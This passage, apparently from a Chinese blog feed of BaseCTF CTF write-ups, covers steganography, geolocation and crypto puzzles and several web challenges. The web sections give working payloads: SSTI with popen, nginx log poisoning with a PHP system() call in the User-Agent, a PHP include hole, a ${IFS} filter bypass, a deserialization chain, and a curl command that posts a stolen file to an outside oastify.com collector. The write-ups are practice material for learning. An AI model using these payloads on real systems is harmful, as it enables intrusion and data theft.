class="string">&#x27;_&#x27;</span>]()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;a=`pwd`;a=`substr $a 1 1`;cd $a;cat flag&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure><h4 id="Week3-滤个不停"><a href="#Week3-滤个不停" class="headerlink" title="[Week3] 滤个不停"></a>[Week3] 滤个不停</h4><p>考点：include包含漏洞，nginx日志注入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;incompetent&#x27;</span>];</span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Datch&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span> !== <span class="string">&#x27;HelloWorld&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;写出程序员的第一行问候吧！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是个什么东东？？？</span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span> , <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;此路不通换条路试试?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件名不合规 请重试&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>分析，第一个参数直接传，第二个要绕过两个if语句。</p><p>strpos() 函数查找字符串在另一字符串中第一次出现的位置。</p><p>stripos() - 查找字符串在另一字符串中第一次出现的位置（不区分大小写）</p><p>strripos() - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</p><p>strrpos() - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</p><p>发现sever是nginx</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912202350760.png" alt="image-20240912202350760"></p><p>网上查找相关信息，发现可以使用日志注入</p><p>构造payload</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">incompetent=HelloWorld&amp;Datch=<span class="regexp">/var/</span><span class="built_in">log</span>/nginx/access.<span class="built_in">log</span></span><br></pre></td></tr></table></figure><p>并在ua(user-agent)处传入执行命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240912202642837.png" alt="image-20240912202642837"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell_exec()等函数无回显执行办法</title>
      <link href="/posts/cef3f5c5.html"/>
      <url>/posts/cef3f5c5.html</url>
      
        <content type="html"><![CDATA[<p>遇到shell_exec()函数无回显执行，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br></pre></td></tr></table></figure><p>在PHP中 “&gt;” 是表示把什么写入什么文件的意思。</p><p>比如这道题目，<strong>既然无回显，那我就把它写进一个文件，然后访问这个文件不就可以了。</strong></p><p>可以使用burp上的Collaborator抓取。</p><h2 id="以上题为例，详细抓取步骤："><a href="#以上题为例，详细抓取步骤：" class="headerlink" title="以上题为例，详细抓取步骤："></a>以上题为例，详细抓取步骤：</h2><p>先将无回显的内容保存在一个文件里，post以下：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="language-bash">=<span class="built_in">cat</span> /f* &gt; 2.txt</span></span><br></pre></td></tr></table></figure><p>这样有了一个文件2.txt，其中是执行了cat /f* 命令的结果，接下来抓取该文件就能看到了。</p><p>使用curl -F将flag文件上传到Burp的Collaborator Client（Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看POST请求包以及打Cookies）(-X指定发送一个POST请求，-F指定要发送的文件)</p><p>获取Collaborator Client分配给BURP的链接：</p><p>打开Burp主界面 —&gt;菜单（Burp）—&gt;Burp Collaboraor Client — &gt; 点击 Copy to Clipboard</p><p>（获取后的链接要手动加上<a href="http://，xx=@+要提取的文件）">http://，xx=@+要提取的文件）</a></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="language-bash">=curl -X POST -F xx=@1.txt http://j6qb1ixdl8li829ybr7wxkuzwq2hqbe0.oastify.com</span></span><br></pre></td></tr></table></figure><p>抓取结果如下：</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823171025594.png" alt=""></p><blockquote><p>对于这类题还有个很简单的方法，直接将flag写进文件，然后路径读取就行</p><p>先测试一下能不能执行 cmd=1;sleep 4</p><p>发现反应了4秒，能执行</p><p>然后直接 cat /f* &gt; 1.txt</p><p>最后访问/1.txt路径就行</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web姿势 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BaseCTF比赛week2-wp</title>
      <link href="/posts/bb6a7637.html"/>
      <url>/posts/bb6a7637.html</url>
      
        <content type="html"><![CDATA[<h1 id="BaseCTF比赛week2-wp"><a href="#BaseCTF比赛week2-wp" class="headerlink" title="BaseCTF比赛week2-wp"></a>BaseCTF比赛week2-wp</h1><p>[TOC]</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h4 id="Week2-黑丝上的flag"><a href="#Week2-黑丝上的flag" class="headerlink" title="[Week2] 黑丝上的flag"></a>[Week2] 黑丝上的flag</h4><p>考点：图片隐写</p><p>打开是一张嗨咝图。根据题目意思，flag应该在黑丝上。放进StegSolve看看，找到了flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823125446281.png" alt="image-20240823125446281"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823121833011.png" alt="image-20240823121833011"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823122015855.png" alt="image-20240823122015855"></p><h4 id="Week2-Base"><a href="#Week2-Base" class="headerlink" title="[Week2] Base?!"></a>[Week2] Base?!</h4><p>考点：简单的base</p><p>下载附件打开，解码出现flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823125548236.png" alt="image-20240823125548236"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823125624311.png" alt="image-20240823125624311"></p><h4 id="Week2-海上又遇了鲨鱼"><a href="#Week2-海上又遇了鲨鱼" class="headerlink" title="[Week2] 海上又遇了鲨鱼"></a>[Week2] 海上又遇了鲨鱼</h4><p>考点：流量分析</p><p>将附件用wireshark打开，发现了关键词flag.zip。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823125804797.png" alt="image-20240823125804797"></p><p>追踪流查看，发现有个登录的password，估计需要，先记下来</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823130203939.png" alt="image-20240823130203939"></p><p>将此文件提取下载出来，解压，密码就是上面的password，找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823130057568.png" alt="image-20240823130057568"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823130127445.png" alt="image-20240823130127445"></p><h4 id="Week2-Aura-酱的旅行日记-I-lt-图寻擂台-gt"><a href="#Week2-Aura-酱的旅行日记-I-lt-图寻擂台-gt" class="headerlink" title="[Week2] Aura 酱的旅行日记 I &lt;图寻擂台&gt;"></a>[Week2] Aura 酱的旅行日记 I &lt;图寻擂台&gt;</h4><p>考点：图片查地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823132107042.png" alt="image-20240823132107042"></p><p>搜索关键词-恐龙化石，博物馆。找到相似的图。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823132200529.png" alt="image-20240823132200529"></p><p>找到地址信息，就是flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823132300257.png" alt="image-20240823132300257"></p><h4 id="Week2-前辈什么的最喜欢了"><a href="#Week2-前辈什么的最喜欢了" class="headerlink" title="[Week2] 前辈什么的最喜欢了"></a>[Week2] 前辈什么的最喜欢了</h4><p>考点：base64</p><p>下载附件，一大串vase64编码，解码找到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823133444346.png" alt="image-20240823133444346"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823133312396.png" alt="image-20240823133312396"></p><h4 id="Week2-Aura-酱的旅行日记-III-lt-图寻擂台-gt"><a href="#Week2-Aura-酱的旅行日记-III-lt-图寻擂台-gt" class="headerlink" title="[Week2] Aura 酱的旅行日记 III &lt;图寻擂台&gt;"></a>[Week2] Aura 酱的旅行日记 III &lt;图寻擂台&gt;</h4><p>考点：图片信息，查地址</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823175518325.png" alt="image-20240823175518325"></p><p>根据图片gps经纬度信息，算出经度纬度。</p><p>计算方式：原经纬度 = 度 + (分/60) + (秒/3600)<br>根据这张图片的经纬度，计算如下：（一般西经是加负号）</p><blockquote><p>纬度：29；40；18.4799999999957265；<br>经度：102；57；46.7.72200000000864861.</p><p>计算得到：</p><p>纬度 = 29.67179999999999881<br>经度 = 102.9521450000000024</p></blockquote><p>最后用地图找到大致位置，找一下附近的风景区，其名字就是flag。</p><h4 id="Week2-反方向的雪"><a href="#Week2-反方向的雪" class="headerlink" title="[Week2] 反方向的雪"></a>[Week2] 反方向的雪</h4><p>考点：文件分离，二进制逆序，空白格隐写，压缩包密码破解</p><p>下载附件解压，发现是一张图片，扔进010editor发现末尾加了其他文件。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191853055.png" alt="image-20240823191853055"></p><p>将这一部分提取出来，如何逆序，发现就是个zip文件（“反方向”的雪）</p><p>需要密码，下面有个提示，但是却不是这个地方的密码。（试了半天，果断放弃，扔进解压工具爆破）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191636716.png" alt="image-20240823191636716"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191728509.png" alt="image-20240823191728509"></p><p>爆破出密码，解压打开发现是空白格隐藏，用到SNOW工具。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191602570.png" alt="image-20240823191602570"></p><p>上面提示的密码是SNOW工具这里用的。（反方向的“雪”）</p><p>拿到flag。完事儿~~</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823191542299.png" alt="image-20240823191542299"></p><h4 id="Week2-哇！珍德食泥鸭"><a href="#Week2-哇！珍德食泥鸭" class="headerlink" title="[Week2] 哇！珍德食泥鸭"></a>[Week2] 哇！珍德食泥鸭</h4><p>考点：文件分离</p><p>下载附件，打开是我们坤坤的gif动图（滑稽）。</p><p>刚开始以为会在某张图里面有信息，结果找遍了都没发现。</p><p>丢尽010editor，发现了一个压缩包</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823235133035.png" alt="image-20240823235133035"></p><p>将压缩包提取出来。在其中一个网页文件发现了flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823235221031.png" alt="image-20240823235221031"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823235250738.png" alt="image-20240823235250738"></p><h4 id="Week2-Aura-酱的旅行日记-IV-lt-图寻擂台-gt"><a href="#Week2-Aura-酱的旅行日记-IV-lt-图寻擂台-gt" class="headerlink" title="[Week2] Aura 酱的旅行日记 IV &lt;图寻擂台&gt;"></a>[Week2] Aura 酱的旅行日记 IV &lt;图寻擂台&gt;</h4><p>考点：图寻</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/F984938C3C836E3B0569FF4E8C089312.jpg" alt=""></p><p>根据图片信息，搜索关键词：二龙戏珠。然后对比图，发现地点在江苏省南京市秦淮区贡院街夫子庙景区，也是本题的flag。</p><h4 id="Week2-Aura-酱的旅行日记-V-lt-图寻擂台-gt"><a href="#Week2-Aura-酱的旅行日记-V-lt-图寻擂台-gt" class="headerlink" title="[Week2] Aura 酱的旅行日记 V &lt;图寻擂台&gt;"></a>[Week2] Aura 酱的旅行日记 V &lt;图寻擂台&gt;</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/F40F7B9C041B4D13302E47B406B89BAA.png" alt=""></p><p>这位伟人的铜像照，很快联想到邓小平故居。其地址就是flag。</p><p>BaseCTF{四川省广安市广安区邓小平故里-邓小平铜像广场and邓小平故居陈列馆}</p><h4 id="Week2-Aura-酱的旅行日记-VI-lt-图寻擂台-gt"><a href="#Week2-Aura-酱的旅行日记-VI-lt-图寻擂台-gt" class="headerlink" title="[Week2] Aura 酱的旅行日记 VI &lt;图寻擂台&gt;"></a>[Week2] Aura 酱的旅行日记 VI &lt;图寻擂台&gt;</h4><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/1CF189710CA1001AA55DD94338E5CF6A.png" alt=""></p><p>一所学校，看到关键词-迎泽。搜索一下，找到了一张相似图片，是太原市第五中学。</p><p>BaseCTF{山西省太原市迎泽区青年路49号太原市第五中学校-建校时间1906年}</p><h4 id="Week2-二维码1-街头小广告"><a href="#Week2-二维码1-街头小广告" class="headerlink" title="[Week2] 二维码1-街头小广告"></a>[Week2] 二维码1-街头小广告</h4><p>考点：二维码残缺</p><p>补上一个角，先扫一下，发现打开了basectf官网。</p><p>放进QRsearch，查看信息，得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909205627737.png" alt="image-20240909205627737"></p><h4 id="Week2-ez-crypto"><a href="#Week2-ez-crypto" class="headerlink" title="[Week2] ez_crypto"></a>[Week2] ez_crypto</h4><p>考点：base64换表，crypto</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">qMfZzunurNTuAdfZxZfZxZrUx2v6x2i0C2u2ngrLyZbKzx0</span><span class="operator">=</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240909210132585.png" alt="image-20240909210132585"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h4 id="Week2-一起吃豆豆"><a href="#Week2-一起吃豆豆" class="headerlink" title="[Week2] 一起吃豆豆"></a>[Week2] 一起吃豆豆</h4><p>考点：控制台源码分析</p><p>打开时j5做的小游戏，直接查看脚本，找到控制游戏结束的位置，发现一串base64编码，解码得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823154153145.png" alt="image-20240823154153145"></p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823154132273.png" alt="image-20240823154132273"></p><h4 id="Week2-你听不到我的声音"><a href="#Week2-你听不到我的声音" class="headerlink" title="[Week2] 你听不到我的声音"></a>[Week2] 你听不到我的声音</h4><p>考点：shell_exec()无回显函数（见笔记）</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823170508632.png" alt="image-20240823170508632"></p><p>shell_exec()是函数执行命令，但是这个地方无法回显。</p><p>先将执行命令后的结果用一个文件保存，之后再读取这个文件就行了。</p><p>先传入：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="language-bash">=<span class="built_in">cat</span> /f* &gt; 2.txt</span></span><br></pre></td></tr></table></figure><p>再粘贴burp里Collaborator里获取的payload。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823170736727.png" alt="image-20240823170736727"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cmd</span><span class="language-bash">=curl -X POST -F xx=@2.txt http://n8w9fjwqhuqrvdodcvrfwstrui09o0poe.oastify.com</span></span><br></pre></td></tr></table></figure><p>之后提取到2.txt文件就能得到flag。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823171025594.png" alt="image-20240823171025594"></p><h4 id="Week2-RCEisamazingwithspace"><a href="#Week2-RCEisamazingwithspace" class="headerlink" title="[Week2] RCEisamazingwithspace"></a>[Week2] RCEisamazingwithspace</h4><p>考点：空白符号过滤</p><p>用${IFS}过滤空白符就行。</p><p><img src="https://gitee.com/star3119391396/cloudimage/raw/master/img/image-20240823181157674.png" alt="image-20240823181157674"></p><h4 id="Week2-ez-ser"><a href="#Week2-ez-ser" class="headerlink" title="[Week2] ez_ser"></a>[Week2] ez_ser</h4><p>考点：简单的反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">re</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$chu0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;chu0))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;chu0-&gt;<span class="variable">$nononono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kw</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;lalalla&quot;</span>.<span class="variable language_">$this</span>-&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pwn</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dusk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$over</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;dusk != <span class="string">&quot;gods&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;什么，你竟敢不认可?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;over-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nothing</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;system(&#x27;cat /flag&#x27;);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;happy happy happy!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you are over!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ser&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>分析一下，看到了__wakeup()函数，所以就使用它这条链了。</p><p>new web() -&gt; new re() -&gt; new pwn() -&gt; new Misc()</p><p>构造如下：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class re&#123;</span><br><span class="line">    public <span class="variable">$chu0</span>;</span><br><span class="line">    public <span class="keyword">function</span> __toString()&#123;</span><br><span class="line">        <span class="keyword">if</span>(!isset(<span class="variable">$this-</span>&gt;chu<span class="number">0</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;I can not believes!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this-</span>&gt;chu<span class="number">0</span>-&gt;<span class="variable">$nonono</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class web &#123;</span><br><span class="line">    public <span class="variable">$kw</span>;</span><br><span class="line">    public <span class="variable">$dt</span>;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __wakeup() &#123;</span><br><span class="line">        echo <span class="string">&quot;lalalla&quot;</span>.<span class="variable">$this-</span>&gt;kw;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> __destruct() &#123;</span><br><span class="line">        echo <span class="string">&quot;ALL Done!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span 